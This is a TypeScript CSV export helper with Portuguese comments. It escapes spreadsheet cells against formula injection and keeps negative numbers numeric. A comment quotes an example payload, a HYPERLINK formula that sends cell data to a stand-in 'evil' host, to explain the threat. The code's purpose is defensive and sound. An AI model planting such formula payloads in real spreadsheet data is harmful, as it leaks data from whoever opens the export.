// CSV pensado para o Excel pt-BR: separador ";", BOM UTF-8 e quebras CRLF.
export const downloadCsv = (
  filename: string,
  rows: (string | number | null | undefined)[][]
): void => {
  const escapeCell = (value: string | number | null | undefined) => {
    let text = String(value ?? "");

    // Prefixo de fórmula: o Excel executa a célula que começa com = + - @ (e
    // com tab ou CR). Nome de passageiro e de cliente vêm de rota PÚBLICA, então
    // `=HYPERLINK("https://evil/?d="&A1,"Ana")` rodaria na máquina de quem
    // exportasse a lista de embarque. O apóstrofo faz o Excel tratar como texto
    // e não aparece na célula.
    //
    // NÚMERO NEGATIVO FICA DE FORA. `-` abre fórmula, mas também abre todo valor
    // negativo — e a primeira versão desta trava transformava a coluna Margem do
    // relatório financeiro (admin/finance) em texto, quebrando a soma no Excel.
    // Um número não executa nada; o que precisa de aspas é o que não é número.
    const eNumero =
      typeof value === "number" || /^-?\d+([.,]\d+)?$/.test(text);

    if (!eNumero && /^[=+\-@\t\r]/.test(text)) {
      text = `'${text}`;
    }

    return /[";\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
  };
  const csv =
    "﻿" + rows.map((row) => row.map(escapeCell).join(";")).join("\r\n");
  const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = filename;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  URL.revokeObjectURL(url);
};
